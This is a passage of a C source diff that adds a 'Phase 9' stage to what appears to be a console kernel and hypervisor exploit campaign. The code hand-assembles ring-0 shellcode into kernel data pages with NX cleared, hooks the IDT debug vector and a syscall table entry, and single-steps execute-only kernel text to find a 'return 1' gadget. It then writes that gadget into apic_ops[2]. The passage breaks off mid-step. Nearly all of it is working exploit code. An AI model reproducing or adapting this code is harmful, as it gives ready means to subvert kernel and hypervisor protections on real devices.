@@ -6371,6 +6371,768 @@ static void campaign_flatz_setup(void) {
         printf("\n");
         fflush(stdout);
 
+        /* ================================================================
+         * Phase 9: Single-Step ktext Gadget Discovery
+         * ================================================================
+         *
+         * Uses the flatz TF (Trap Flag) single-stepping technique to trace
+         * the original xapic_mode function in ktext without reading ktext
+         * memory (which is blocked by NPT XOM enforcement).
+         *
+         * Approach:
+         *   1. Write a minimal #DB handler to kdata (logs RIP+RAX per step)
+         *   2. Write a launcher to kdata (sets TF, calls target, clears TF)
+         *   3. Hook IDT[1] → our #DB handler (via DMAP write)
+         *   4. Hook sysent[253] → our launcher (via DMAP write)
+         *   5. syscall(253) → launcher sets TF → calls xapic_mode in ktext
+         *      → each instruction triggers #DB → handler logs RIP+RAX
+         *      → function returns → launcher clears TF → returns to user
+         *   6. Read trace log, find where RAX=1 → that instruction address
+         *      is the 'mov eax, 1' (or equivalent) we need
+         *   7. Restore IDT[1], sysent[253], kdata content
+         *
+         * Safety:
+         *   - TF is cleared by CPU before entering #DB handler (no recursion)
+         *   - Interrupts during tracing: handler runs with TF=0, IRET
+         *     restores TF=1, tracing resumes transparently
+         *   - All modifications are restored before returning
+         *   - Only traces well-known kernel functions (xapic_mode)
+         *
+         * Memory layout in kdata (all within NX-cleared page):
+         *   +0x200: #DB handler shellcode (~70 bytes)
+         *   +0x280: Launcher shellcode (~70 bytes)
+         *   +0x400: Trace buffer header (8 bytes: uint32 count + reserved)
+         *   +0x408: Trace entries (up to 128 × 16 bytes = 2048 bytes)
+         * ================================================================ */
+
+        printf("=============================================\n");
+        printf("  Phase 9: Single-Step ktext Gadget Discovery\n");
+        printf("=============================================\n\n");
+        fflush(stdout);
+
+        /* ── Prerequisites check ── */
+        if (!g_apic_ops_addr || g_apic_ops_count < 4) {
+            printf("[-] Phase 9: apic_ops not discovered — skipping.\n\n");
+            fflush(stdout);
+            return;
+        }
+
+        /* Re-derive sysent KVA from known kstuff offset */
+        uint64_t p9_sysent_kva = g_kdata_base + KSTUFF_SYSENTS_OFF;
+        #define P9_SYSENT_STRIDE 0x30  /* 48 bytes per sysent entry */
+        #define P9_TEST_SYSCALL  253   /* issetugid — safe, no side effects */
+        #define P9_MAX_TRACE     128   /* max instructions to log */
+
+        /* Verify sysent is plausible: read entry 20 (getpid), check narg=0 */
+        {
+            uint64_t gp_kva = p9_sysent_kva + 20ULL * P9_SYSENT_STRIDE;
+            uint64_t gp_pa = va_to_pa_quiet(gp_kva);
+            if (!gp_pa) {
+                printf("[-] Phase 9: sysent VA→PA failed for getpid — skipping.\n\n");
+                fflush(stdout);
+                return;
+            }
+            int32_t gp_narg = -1;
+            kernel_copyout(g_dmap_base + gp_pa, &gp_narg, 4);
+            if (gp_narg != 0) {
+                printf("[-] Phase 9: sysent[20].narg=%d (expected 0) — bad offset.\n\n",
+                       gp_narg);
+                fflush(stdout);
+                return;
+            }
+            printf("[+] Phase 9: sysent verified (getpid narg=%d)\n", gp_narg);
+        }
+
+        /* Get original xapic_mode address from apic_ops[2] */
+        uint64_t p9_ops_pa = va_to_pa_quiet(g_apic_ops_addr);
+        if (!p9_ops_pa) {
+            printf("[-] Phase 9: apic_ops VA→PA failed — skipping.\n\n");
+            fflush(stdout);
+            return;
+        }
+        uint64_t p9_target_func = 0;
+        kernel_copyout(g_dmap_base + p9_ops_pa + 0x10, &p9_target_func, 8);
+
+        if (p9_target_func < g_ktext_base ||
+            p9_target_func >= g_ktext_base + 0x2000000) {
+            printf("[-] Phase 9: apic_ops[2] = 0x%lx — not in ktext range.\n",
+                   (unsigned long)p9_target_func);
+            printf("    (Already hooked? Restore original first.)\n\n");
+            fflush(stdout);
+            return;
+        }
+
+        printf("[*] Target function: apic_ops[2] (xapic_mode) = 0x%016lx\n",
+               (unsigned long)p9_target_func);
+        printf("    ktext+0x%lx\n",
+               (unsigned long)(p9_target_func - g_ktext_base));
+        fflush(stdout);
+
+        /* ── Compute addresses ── */
+        #define P9_DB_HANDLER_OFF   0x200   /* #DB handler in kdata page */
+        #define P9_LAUNCHER_OFF     0x280   /* Launcher in kdata page */
+        #define P9_TRACE_BUF_OFF    0x400   /* Trace buffer in kdata page */
+
+        uint64_t p9_kdata_pa = va_to_pa_quiet(g_kdata_base);
+        if (!p9_kdata_pa) {
+            printf("[-] Phase 9: kdata VA→PA failed.\n\n");
+            fflush(stdout);
+            return;
+        }
+
+        uint64_t db_handler_kva  = g_kdata_base + P9_DB_HANDLER_OFF;
+        uint64_t launcher_kva    = g_kdata_base + P9_LAUNCHER_OFF;
+        uint64_t trace_buf_kva   = g_kdata_base + P9_TRACE_BUF_OFF;
+        uint64_t db_handler_dmap = g_dmap_base + p9_kdata_pa + P9_DB_HANDLER_OFF;
+        uint64_t launcher_dmap   = g_dmap_base + p9_kdata_pa + P9_LAUNCHER_OFF;
+        uint64_t trace_buf_dmap  = g_dmap_base + p9_kdata_pa + P9_TRACE_BUF_OFF;
+
+        printf("[*] #DB handler KVA: 0x%016lx (kdata+0x%x)\n",
+               (unsigned long)db_handler_kva, P9_DB_HANDLER_OFF);
+        printf("[*] Launcher KVA:    0x%016lx (kdata+0x%x)\n",
+               (unsigned long)launcher_kva, P9_LAUNCHER_OFF);
+        printf("[*] Trace buf KVA:   0x%016lx (kdata+0x%x)\n",
+               (unsigned long)trace_buf_kva, P9_TRACE_BUF_OFF);
+        fflush(stdout);
+
+        /* ── Verify NX is already cleared on kdata page ── */
+        {
+            uint64_t pte_walk;
+            /* Walk to PDE level */
+            kernel_copyout(g_dmap_base + g_cr3_phys +
+                           ((g_kdata_base >> 39) & 0x1FF) * 8, &pte_walk, 8);
+            if (!(pte_walk & 1)) {
+                printf("[-] Phase 9: kdata PML4E not present.\n\n");
+                fflush(stdout);
+                return;
+            }
+            kernel_copyout(g_dmap_base + (pte_walk & 0xFFFFFFFFF000ULL) +
+                           ((g_kdata_base >> 30) & 0x1FF) * 8, &pte_walk, 8);
+            if (!(pte_walk & 1)) {
+                printf("[-] Phase 9: kdata PDPE not present.\n\n");
+                fflush(stdout);
+                return;
+            }
+            kernel_copyout(g_dmap_base + (pte_walk & 0xFFFFFFFFF000ULL) +
+                           ((g_kdata_base >> 21) & 0x1FF) * 8, &pte_walk, 8);
+            int p9_nx = (int)(pte_walk >> 63);
+            if (p9_nx) {
+                printf("[!] Phase 9: kdata PTE still has NX=1 — need Phase 5b first.\n");
+                printf("    Run the full campaign to clear NX before Phase 9.\n\n");
+                fflush(stdout);
+                return;
+            }
+            printf("[+] kdata NX already cleared (PDE=0x%016lx) — good.\n",
+                   (unsigned long)pte_walk);
+        }
+        fflush(stdout);
+
+        /* ── Step 1: Save original kdata content ── */
+        printf("\n[*] Step 1: Saving original kdata content...\n");
+        uint8_t p9_backup_db[128], p9_backup_launcher[128];
+        uint8_t p9_backup_trace[16];  /* just header */
+        kernel_copyout(db_handler_dmap, p9_backup_db, sizeof(p9_backup_db));
+        kernel_copyout(launcher_dmap, p9_backup_launcher, sizeof(p9_backup_launcher));
+        kernel_copyout(trace_buf_dmap, p9_backup_trace, sizeof(p9_backup_trace));
+        printf("    Saved %zu + %zu + %zu bytes.\n",
+               sizeof(p9_backup_db), sizeof(p9_backup_launcher),
+               sizeof(p9_backup_trace));
+        fflush(stdout);
+
+        /* ── Step 2: Build and write #DB handler shellcode ── */
+        /*
+         * #DB handler (interrupt gate, ring 0):
+         *
+         * On entry, CPU has pushed: SS, RSP, RFLAGS, CS, RIP
+         * CPU cleared TF in current RFLAGS (handler runs normally).
+         * Saved RFLAGS on stack still has TF=1 (IRET will re-enable).
+         *
+         * Handler:
+         *   1. push rax, rbx, rcx
+         *   2. Load trace buffer DMAP VA (embedded immediate)
+         *   3. Read count from [buf+0]
+         *   4. If count >= MAX_TRACE: clear TF in saved RFLAGS, IRET
+         *   5. Store entry: [buf + 8 + count*16] = { saved_RIP, saved_RAX }
+         *   6. Increment count
+         *   7. pop rcx, rbx, rax
+         *   8. IRETQ (TF restored from saved RFLAGS → next instr traced)
+         *
+         * Stack layout after our pushes:
+         *   [RSP+0]  = saved RCX
+         *   [RSP+8]  = saved RBX
+         *   [RSP+16] = saved RAX
+         *   [RSP+24] = RIP  (from interrupt frame)
+         *   [RSP+32] = CS
+         *   [RSP+40] = RFLAGS
+         */
+        printf("[*] Step 2: Building #DB handler shellcode...\n");
+        {
+            uint8_t db[128];
+            int dp = 0;
+
+            #undef EMIT
+            #undef EMIT_U32
+            #undef EMIT_U64
+            #define EMIT(b) do { if (dp < (int)sizeof(db)) db[dp++] = (uint8_t)(b); } while(0)
+            #define EMIT_U32(v) do { uint32_t _v=(v); if(dp+4<=(int)sizeof(db)){memcpy(&db[dp],&_v,4);dp+=4;} } while(0)
+            #define EMIT_U64(v) do { uint64_t _v=(v); if(dp+8<=(int)sizeof(db)){memcpy(&db[dp],&_v,8);dp+=8;} } while(0)
+
+            /* Save registers */
+            EMIT(0x50);  /* push rax */
+            EMIT(0x53);  /* push rbx */
+            EMIT(0x51);  /* push rcx */
+
+            /* movabs $trace_buf_dmap, %rbx */
+            EMIT(0x48); EMIT(0xBB); EMIT_U64(trace_buf_dmap);
+
+            /* mov (%rbx), %ecx  — load count */
+            EMIT(0x8B); EMIT(0x0B);
+
+            /* cmp $P9_MAX_TRACE, %ecx */
+            EMIT(0x81); EMIT(0xF9); EMIT_U32(P9_MAX_TRACE);
+
+            /* jge .stop_tracing (forward jump, patch offset below) */
+            EMIT(0x7D);
+            int jge_patch = dp;  /* save position for offset byte */
+            EMIT(0x00);  /* placeholder */
+
+            /* ── Log entry: buf + 8 + ecx*16 ── */
+            /* lea 8(%rbx), %rax */
+            EMIT(0x48); EMIT(0x8D); EMIT(0x43); EMIT(0x08);
+
+            /* shl $4, %ecx  (count * 16) */
+            EMIT(0xC1); EMIT(0xE1); EMIT(0x04);
+
+            /* add %rcx, %rax */
+            EMIT(0x48); EMIT(0x01); EMIT(0xC8);
+
+            /* mov 24(%rsp), %rcx  — saved RIP from interrupt frame */
+            EMIT(0x48); EMIT(0x8B); EMIT(0x4C); EMIT(0x24); EMIT(0x18);
+
+            /* mov %rcx, (%rax)  — store RIP */
+            EMIT(0x48); EMIT(0x89); EMIT(0x08);
+
+            /* mov 16(%rsp), %rcx  — saved RAX (our first push) */
+            EMIT(0x48); EMIT(0x8B); EMIT(0x4C); EMIT(0x24); EMIT(0x10);
+
+            /* mov %rcx, 8(%rax)  — store RAX */
+            EMIT(0x48); EMIT(0x89); EMIT(0x48); EMIT(0x08);
+
+            /* incl (%rbx)  — increment count */
+            EMIT(0xFF); EMIT(0x03);
+
+            /* pop rcx; pop rbx; pop rax; iretq */
+            EMIT(0x59);  /* pop rcx */
+            EMIT(0x5B);  /* pop rbx */
+            EMIT(0x58);  /* pop rax */
+            EMIT(0x48); EMIT(0xCF);  /* iretq */
+
+            /* .stop_tracing: */
+            int stop_label = dp;
+            db[jge_patch] = (uint8_t)(stop_label - (jge_patch + 1));
+
+            /* Clear TF in saved RFLAGS: andq $~0x100, 40(%rsp) */
+            /* REX.W AND r/m64, imm32: 48 81 /4 disp8 imm32 */
+            /* ModRM: mod=01 reg=100(/4) rm=100(SIB) = 0x64 */
+            /* SIB: scale=00 index=100(none) base=100(RSP) = 0x24 */
+            EMIT(0x48); EMIT(0x81); EMIT(0x64); EMIT(0x24);
+            EMIT(0x28);  /* disp8 = 40 */
+            EMIT_U32(0xFFFFFEFF);  /* imm32: ~0x100 sign-extends to clear TF */
+
+            /* pop rcx; pop rbx; pop rax; iretq */
+            EMIT(0x59);
+            EMIT(0x5B);
+            EMIT(0x58);
+            EMIT(0x48); EMIT(0xCF);
+
+            printf("    #DB handler: %d bytes\n", dp);
+
+            /* Write to kdata via DMAP */
+            kernel_copyin(db, db_handler_dmap, dp);
+
+            /* Verify */
+            uint8_t db_verify[128];
+            kernel_copyout(db_handler_dmap, db_verify, dp);
+            if (memcmp(db, db_verify, dp) != 0) {
+                printf("[-] #DB handler write verification failed!\n");
+                kernel_copyin(p9_backup_db, db_handler_dmap, sizeof(p9_backup_db));
+                fflush(stdout);
+                return;
+            }
+            printf("    Write verified OK.\n");
+        }
+        fflush(stdout);
+
+        /* ── Step 3: Build and write launcher shellcode ── */
+        /*
+         * Launcher (called via sysent as sys_foo(td, uap)):
+         *   1. pushfq; or TF; popfq  — enable single-stepping
+         *   2. call <target_func_kva> — traces xapic_mode
+         *   3. pushfq; and ~TF; popfq — disable single-stepping
+         *   4. Store return value to trace buffer metadata
+         *   5. xor eax, eax; ret      — return 0 (success)
+         *
+         * Note: The first #DB fires after POPFQ (step 1), tracing
+         * the CALL instruction itself.  After RET from xapic_mode,
+         * #DB fires with RIP = instruction after CALL.  We filter
+         * by checking if RIP is in ktext range.
+         */
+        printf("[*] Step 3: Building launcher shellcode...\n");
+        {
+            uint8_t lc[128];
+            int lp = 0;
+
+            #undef EMIT
+            #undef EMIT_U32
+            #undef EMIT_U64
+            #define EMIT(b) do { if (lp < (int)sizeof(lc)) lc[lp++] = (uint8_t)(b); } while(0)
+            #define EMIT_U32(v) do { uint32_t _v=(v); if(lp+4<=(int)sizeof(lc)){memcpy(&lc[lp],&_v,4);lp+=4;} } while(0)
+            #define EMIT_U64(v) do { uint64_t _v=(v); if(lp+8<=(int)sizeof(lc)){memcpy(&lc[lp],&_v,8);lp+=8;} } while(0)
+
+            /* Save callee-saved + RAX */
+            EMIT(0x53);  /* push rbx */
+            EMIT(0x55);  /* push rbp */
+            EMIT(0x41); EMIT(0x54);  /* push r12 */
+
+            /* Load target function address into r12 */
+            /* movabs $target, %r12 */
+            EMIT(0x49); EMIT(0xBC); EMIT_U64(p9_target_func);
+
+            /* Enable TF: pushfq; or $0x100, (%rsp); popfq */
+            EMIT(0x9C);  /* pushfq */
+            /* or qword [rsp], 0x100 */
+            /* REX.W OR r/m64, imm32: 48 81 /1 [rsp] imm32 */
+            EMIT(0x48); EMIT(0x81); EMIT(0x0C); EMIT(0x24);
+            EMIT_U32(0x100);
+            EMIT(0x9D);  /* popfq — TF now set, next instr triggers #DB */
+
+            /* CALL *%r12  — calls xapic_mode in ktext */
+            /* Each instruction will trigger #DB → our handler logs it */
+            EMIT(0x41); EMIT(0xFF); EMIT(0xD4);  /* call *r12 */
+
+            /* Disable TF: pushfq; and $~0x100, (%rsp); popfq */
+            EMIT(0x9C);  /* pushfq */
+            EMIT(0x48); EMIT(0x81); EMIT(0x24); EMIT(0x24);
+            EMIT_U32(0xFFFFFEFF);  /* and qword [rsp], ~TF */
+            EMIT(0x9D);  /* popfq — TF now clear */
+
+            /* Save xapic_mode return value to trace buffer metadata.
+             * trace_buf_dmap + 4 = return value slot (uint32_t at +4)
+             * Actually store full rax at a known offset for clarity.
+             * Use trace_buf_dmap as base, store retval at offset +4 (32-bit). */
+            /* movabs $trace_buf_dmap, %rbx */
+            EMIT(0x48); EMIT(0xBB); EMIT_U64(trace_buf_dmap);
+            /* mov %eax, 4(%rbx)  — store return value (low 32 bits) */
+            EMIT(0x89); EMIT(0x43); EMIT(0x04);
+
+            /* xor eax, eax — return 0 (syscall success) */
+            EMIT(0x31); EMIT(0xC0);
+
+            /* Restore callee-saved */
+            EMIT(0x41); EMIT(0x5C);  /* pop r12 */
+            EMIT(0x5D);  /* pop rbp */
+            EMIT(0x5B);  /* pop rbx */
+
+            /* ret */
+            EMIT(0xC3);
+
+            printf("    Launcher: %d bytes\n", lp);
+
+            /* Write to kdata via DMAP */
+            kernel_copyin(lc, launcher_dmap, lp);
+
+            /* Verify */
+            uint8_t lc_verify[128];
+            kernel_copyout(launcher_dmap, lc_verify, lp);
+            if (memcmp(lc, lc_verify, lp) != 0) {
+                printf("[-] Launcher write verification failed!\n");
+                kernel_copyin(p9_backup_db, db_handler_dmap, sizeof(p9_backup_db));
+                kernel_copyin(p9_backup_launcher, launcher_dmap, sizeof(p9_backup_launcher));
+                fflush(stdout);
+                return;
+            }
+            printf("    Write verified OK.\n");
+        }
+        fflush(stdout);
+
+        /* ── Step 4: Clear trace buffer ── */
+        printf("[*] Step 4: Clearing trace buffer...\n");
+        {
+            uint8_t zeros[8] = {0};
+            kernel_copyin(zeros, trace_buf_dmap, 8);
+            printf("    Trace buffer cleared (count=0, retval=0).\n");
+        }
+        fflush(stdout);
+
+        /* ── Step 5: Hook IDT[1] (#DB) → our handler ── */
+        printf("[*] Step 5: Hooking IDT[1] (#DB)...\n");
+
+        /* IDT gate descriptor (same layout as campaign_kmod_kldload) */
+        struct p9_idt_gate {
+            uint16_t offset_lo;
+            uint16_t selector;
+            uint8_t  ist;
+            uint8_t  type_attr;
+            uint16_t offset_mid;
+            uint32_t offset_hi;
+            uint32_t reserved;
+        } __attribute__((packed));
+
+        uint64_t p9_idt_base = g_kdata_base + KSTUFF_IDT_OFF;
+        uint64_t p9_idt1_kva = p9_idt_base + 1 * 16;  /* IDT[1] is 16 bytes */
+        uint64_t p9_idt1_pa  = va_to_pa_quiet(p9_idt1_kva);
+
+        if (!p9_idt1_pa) {
+            printf("[-] IDT[1] VA→PA failed.\n");
+            kernel_copyin(p9_backup_db, db_handler_dmap, sizeof(p9_backup_db));
+            kernel_copyin(p9_backup_launcher, launcher_dmap, sizeof(p9_backup_launcher));
+            fflush(stdout);
+            return;
+        }
+
+        /* Read original IDT[1] */
+        struct p9_idt_gate p9_orig_idt1;
+        kernel_copyout(g_dmap_base + p9_idt1_pa, &p9_orig_idt1, 16);
+
+        uint64_t orig_db_handler = (uint64_t)p9_orig_idt1.offset_lo |
+                                   ((uint64_t)p9_orig_idt1.offset_mid << 16) |
+                                   ((uint64_t)p9_orig_idt1.offset_hi << 32);
+        printf("    Original IDT[1]: handler=0x%016lx sel=0x%04x ist=%d type=0x%02x\n",
+               (unsigned long)orig_db_handler,
+               p9_orig_idt1.selector, p9_orig_idt1.ist,
+               p9_orig_idt1.type_attr);
+
+        /* Build new IDT[1] pointing to our #DB handler */
+        struct p9_idt_gate p9_new_idt1;
+        memset(&p9_new_idt1, 0, sizeof(p9_new_idt1));
+        p9_new_idt1.offset_lo  = (uint16_t)(db_handler_kva & 0xFFFF);
+        p9_new_idt1.offset_mid = (uint16_t)((db_handler_kva >> 16) & 0xFFFF);
+        p9_new_idt1.offset_hi  = (uint32_t)(db_handler_kva >> 32);
+        p9_new_idt1.selector   = p9_orig_idt1.selector;  /* kernel CS */
+        p9_new_idt1.ist        = 0;  /* use current kernel stack (safe in ring 0) */
+        p9_new_idt1.type_attr  = 0x8E;  /* P=1, DPL=0, interrupt gate (64-bit) */
+
+        printf("    New IDT[1]:      handler=0x%016lx sel=0x%04x ist=0 type=0x8E\n",
+               (unsigned long)db_handler_kva, p9_new_idt1.selector);
+
+        /* Install new IDT[1] */
+        kernel_copyin(&p9_new_idt1, g_dmap_base + p9_idt1_pa, 16);
+
+        /* Verify */
+        struct p9_idt_gate p9_idt1_verify;
+        kernel_copyout(g_dmap_base + p9_idt1_pa, &p9_idt1_verify, 16);
+        if (memcmp(&p9_new_idt1, &p9_idt1_verify, 16) != 0) {
+            printf("[-] IDT[1] write verification failed! Restoring...\n");
+            kernel_copyin(&p9_orig_idt1, g_dmap_base + p9_idt1_pa, 16);
+            kernel_copyin(p9_backup_db, db_handler_dmap, sizeof(p9_backup_db));
+            kernel_copyin(p9_backup_launcher, launcher_dmap, sizeof(p9_backup_launcher));
+            fflush(stdout);
+            return;
+        }
+        printf("    IDT[1] hooked OK.\n");
+        fflush(stdout);
+
+        /* ── Step 6: Hook sysent[253] → launcher ── */
+        printf("[*] Step 6: Hooking sysent[%d] → launcher...\n", P9_TEST_SYSCALL);
+
+        uint64_t p9_ent_kva = p9_sysent_kva + (uint64_t)P9_TEST_SYSCALL * P9_SYSENT_STRIDE;
+        uint64_t p9_ent_pa  = va_to_pa_quiet(p9_ent_kva);
+
+        if (!p9_ent_pa) {
+            printf("[-] sysent[%d] VA→PA failed! Restoring IDT[1]...\n",
+                   P9_TEST_SYSCALL);
+            kernel_copyin(&p9_orig_idt1, g_dmap_base + p9_idt1_pa, 16);
+            kernel_copyin(p9_backup_db, db_handler_dmap, sizeof(p9_backup_db));
+            kernel_copyin(p9_backup_launcher, launcher_dmap, sizeof(p9_backup_launcher));
+            fflush(stdout);
+            return;
+        }
+
+        /* Save original sysent[253] (full 48-byte entry) */
+        uint8_t p9_orig_sysent[P9_SYSENT_STRIDE];
+        kernel_copyout(g_dmap_base + p9_ent_pa, p9_orig_sysent, P9_SYSENT_STRIDE);
+
+        uint64_t p9_orig_call = 0;
+        memcpy(&p9_orig_call, &p9_orig_sysent[8], 8);
+        printf("    Original sysent[%d].sy_call = 0x%016lx\n",
+               P9_TEST_SYSCALL, (unsigned long)p9_orig_call);
+
+        /* Write launcher_kva into sy_call (offset +8) */
+        uint64_t p9_call_pa = va_to_pa_quiet(p9_ent_kva + 8);
+        kernel_copyin(&launcher_kva, g_dmap_base + p9_call_pa, 8);
+
+        /* Set narg=0 (offset +0) */
+        int32_t p9_narg_zero = 0;
+        kernel_copyin(&p9_narg_zero, g_dmap_base + p9_ent_pa, 4);
+
+        /* Verify hook */
+        uint64_t p9_hook_verify = 0;
+        kernel_copyout(g_dmap_base + p9_call_pa, &p9_hook_verify, 8);
+        printf("    sysent[%d].sy_call = 0x%016lx [%s]\n",
+               P9_TEST_SYSCALL, (unsigned long)p9_hook_verify,
+               p9_hook_verify == launcher_kva ? "OK" : "MISMATCH");
+
+        if (p9_hook_verify != launcher_kva) {
+            printf("[-] Sysent hook failed! Restoring...\n");
+            kernel_copyin(p9_orig_sysent, g_dmap_base + p9_ent_pa, P9_SYSENT_STRIDE);
+            kernel_copyin(&p9_orig_idt1, g_dmap_base + p9_idt1_pa, 16);
+            kernel_copyin(p9_backup_db, db_handler_dmap, sizeof(p9_backup_db));
+            kernel_copyin(p9_backup_launcher, launcher_dmap, sizeof(p9_backup_launcher));
+            fflush(stdout);
+            return;
+        }
+        fflush(stdout);
+
+        /* ── Step 7: Fire! Call syscall(253) to trace xapic_mode ── */
+        printf("\n[*] Step 7: Calling syscall(%d) → single-step trace of xapic_mode...\n",
+               P9_TEST_SYSCALL);
+        fflush(stdout);
+
+        long p9_ret = syscall(P9_TEST_SYSCALL);
+        int p9_err = errno;
+
+        printf("[+] syscall(%d) returned %ld (errno=%d)\n",
+               P9_TEST_SYSCALL, p9_ret, p9_err);
+        fflush(stdout);
+
+        /* ── Step 8: IMMEDIATELY restore sysent + IDT ── */
+        printf("[*] Step 8: Restoring sysent[%d] and IDT[1]...\n",
+               P9_TEST_SYSCALL);
+
+        kernel_copyin(p9_orig_sysent, g_dmap_base + p9_ent_pa, P9_SYSENT_STRIDE);
+        kernel_copyin(&p9_orig_idt1, g_dmap_base + p9_idt1_pa, 16);
+
+        /* Verify restorations */
+        uint64_t p9_restore_call = 0;
+        kernel_copyout(g_dmap_base + p9_call_pa, &p9_restore_call, 8);
+        struct p9_idt_gate p9_restore_idt;
+        kernel_copyout(g_dmap_base + p9_idt1_pa, &p9_restore_idt, 16);
+        printf("    sysent[%d] restored: 0x%016lx [%s]\n",
+               P9_TEST_SYSCALL, (unsigned long)p9_restore_call,
+               p9_restore_call == p9_orig_call ? "OK" : "FAIL");
+        printf("    IDT[1] restored: [%s]\n",
+               memcmp(&p9_restore_idt, &p9_orig_idt1, 16) == 0 ? "OK" : "FAIL");
+        fflush(stdout);
+
+        /* ── Step 9: Read and analyze trace log ── */
+        printf("\n[*] Step 9: Reading trace log...\n");
+
+        uint32_t p9_trace_count = 0;
+        uint32_t p9_retval = 0;
+        kernel_copyout(trace_buf_dmap, &p9_trace_count, 4);
+        kernel_copyout(trace_buf_dmap + 4, &p9_retval, 4);
+
+        printf("    Traced instructions: %u (max %d)\n",
+               p9_trace_count, P9_MAX_TRACE);
+        printf("    xapic_mode returned: %u\n", p9_retval);
+
+        if (p9_trace_count == 0) {
+            printf("[-] No trace entries! #DB handler may not have fired.\n");
+            printf("    Possible causes:\n");
+            printf("      - IDT[1] hook didn't take effect (TLB cached old entry?)\n");
+            printf("      - TF not set properly in launcher\n");
+            printf("      - #DB handler crashed silently\n");
+            kernel_copyin(p9_backup_db, db_handler_dmap, sizeof(p9_backup_db));
+            kernel_copyin(p9_backup_launcher, launcher_dmap, sizeof(p9_backup_launcher));
+            kernel_copyin(p9_backup_trace, trace_buf_dmap, sizeof(p9_backup_trace));
+            fflush(stdout);
+            return;
+        }
+
+        /* Read all trace entries */
+        int p9_nread = p9_trace_count;
+        if (p9_nread > P9_MAX_TRACE) p9_nread = P9_MAX_TRACE;
+
+        struct { uint64_t rip; uint64_t rax; } p9_entries[P9_MAX_TRACE];
+        kernel_copyout(trace_buf_dmap + 8, p9_entries, p9_nread * 16);
+
+        /* Print trace (filter: only show ktext entries) */
+        printf("\n    === Instruction Trace (ktext entries only) ===\n");
+        printf("    %4s  %-18s  %-18s  %s\n",
+               "#", "RIP", "RAX", "ktext+offset");
+
+        int p9_ktext_entries = 0;
+        int p9_gadget_found = 0;
+        uint64_t p9_gadget_addr = 0;
+        int p9_first_rax1_idx = -1;
+
+        for (int i = 0; i < p9_nread; i++) {
+            uint64_t rip = p9_entries[i].rip;
+            uint64_t rax = p9_entries[i].rax;
+
+            int in_ktext = (rip >= g_ktext_base &&
+                            rip < g_ktext_base + 0x2000000);
+
+            if (in_ktext) {
+                printf("    %4d  0x%016lx  0x%016lx  ktext+0x%lx",
+                       i, (unsigned long)rip, (unsigned long)rax,
+                       (unsigned long)(rip - g_ktext_base));
+
+                /* Detect the instruction that sets RAX=1 */
+                if ((rax & 0xFFFFFFFF) == 1 && p9_first_rax1_idx < 0) {
+                    p9_first_rax1_idx = i;
+                    printf("  ← RAX=1 first seen here");
+                }
+
+                printf("\n");
+                p9_ktext_entries++;
+            }
+        }
+
+        printf("\n    Total ktext entries: %d / %d traced\n",
+               p9_ktext_entries, p9_nread);
+
+        /* Heuristic: Find the 'mov eax, 1' instruction.
+         *
+         * Look for the transition where RAX changes TO 1.
+         * The instruction at that RIP is the 'mov eax, 1' (or equivalent).
+         * Verify: the PREVIOUS entry had RAX != 1.
+         *
+         * Then check if the NEXT ktext entry is the last one (i.e., it's
+         * the RET instruction).  If so, the gadget is from the mov eax,1
+         * instruction to the ret.
+         */
+        if (p9_first_rax1_idx >= 0) {
+            uint64_t candidate_rip = p9_entries[p9_first_rax1_idx].rip;
+
+            /* Verify previous instruction had RAX != 1 (transition) */
+            int is_transition = 1;
+            if (p9_first_rax1_idx > 0) {
+                uint64_t prev_rax = p9_entries[p9_first_rax1_idx - 1].rax;
+                if ((prev_rax & 0xFFFFFFFF) == 1)
+                    is_transition = 0;  /* RAX was already 1 — not the mov */
+            }
+
+            /* Check the RIP is in ktext */
+            int cand_in_ktext = (candidate_rip >= g_ktext_base &&
+                                 candidate_rip < g_ktext_base + 0x2000000);
+
+            if (is_transition && cand_in_ktext) {
+                p9_gadget_found = 1;
+                p9_gadget_addr = candidate_rip;
+
+                printf("\n[+] ============================================\n");
+                printf("[+]  GADGET CANDIDATE FOUND!\n");
+                printf("[+] ============================================\n");
+                printf("[+]  Address: 0x%016lx (ktext+0x%lx)\n",
+                       (unsigned long)p9_gadget_addr,
+                       (unsigned long)(p9_gadget_addr - g_ktext_base));
+                printf("[+]  Trace index: %d\n", p9_first_rax1_idx);
+                printf("[+]  This is the instruction that sets RAX=1.\n");
+                printf("[+]  If followed by RET, this is 'mov eax, 1; ret'.\n");
+                printf("[+]\n");
+                printf("[+]  SAFE FOR apic_ops[2] DURING SUSPEND:\n");
+                printf("[+]    - Located in ktext (NPT always allows execute)\n");
+                printf("[+]    - Returns 1 = APIC_MODE_XAPIC\n");
+                printf("[+]    - No memory references, no side effects\n");
+            } else if (!is_transition) {
+                printf("\n[*] RAX was already 1 before trace entry %d.\n",
+                       p9_first_rax1_idx);
+                printf("    xapic_mode may be a simple 'return 1' function.\n");
+                printf("    The function entry point itself may BE the gadget.\n");
+
+                /* In this case, the function entry is the gadget */
+                if (p9_target_func >= g_ktext_base &&
+                    p9_target_func < g_ktext_base + 0x2000000) {
+                    p9_gadget_found = 1;
+                    p9_gadget_addr = p9_target_func;
+                    printf("[+] Using function entry as gadget: 0x%016lx\n",
+                           (unsigned long)p9_gadget_addr);
+                }
+            }
+        }
+
+        if (!p9_gadget_found && p9_retval == 1) {
+            /* xapic_mode returned 1 but we couldn't find the exact
+             * instruction.  The function entry itself works. */
+            printf("\n[*] xapic_mode returned 1 but exact gadget instruction unclear.\n");
+            printf("[*] Using function entry as fallback gadget.\n");
+            p9_gadget_found = 1;
+            p9_gadget_addr = p9_target_func;
+        }
+
+        /* ── Step 10: If gadget found, offer to arm apic_ops[2] ── */
+        if (p9_gadget_found) {
+            printf("\n[*] Step 10: Arming apic_ops[2] with ktext gadget...\n");
+            printf("    Gadget:  0x%016lx (ktext+0x%lx)\n",
+                   (unsigned long)p9_gadget_addr,
+                   (unsigned long)(p9_gadget_addr - g_ktext_base));
+            printf("    Target:  apic_ops[2] at kdata+0x%lx\n",
+                   (unsigned long)(g_apic_ops_addr - g_kdata_base + 0x10));
+
+            /* Save original for restore */
+            uint64_t p9_orig_xapic = 0;
+            kernel_copyout(g_dmap_base + p9_ops_pa + 0x10, &p9_orig_xapic, 8);
+            printf("    Original apic_ops[2]: 0x%016lx\n",
+                   (unsigned long)p9_orig_xapic);
+
+            /* Write ktext gadget address to apic_ops[2] */
+            kernel_copyin(&p9_gadget_addr, g_dmap_base + p9_ops_pa + 0x10, 8);
+
+            /* Verify */
+            uint64_t p9_armed_verify = 0;
+            kernel_copyout(g_dmap_base + p9_ops_pa + 0x10, &p9_armed_verify, 8);
+            int p9_armed_ok = (p9_armed_verify == p9_gadget_addr);
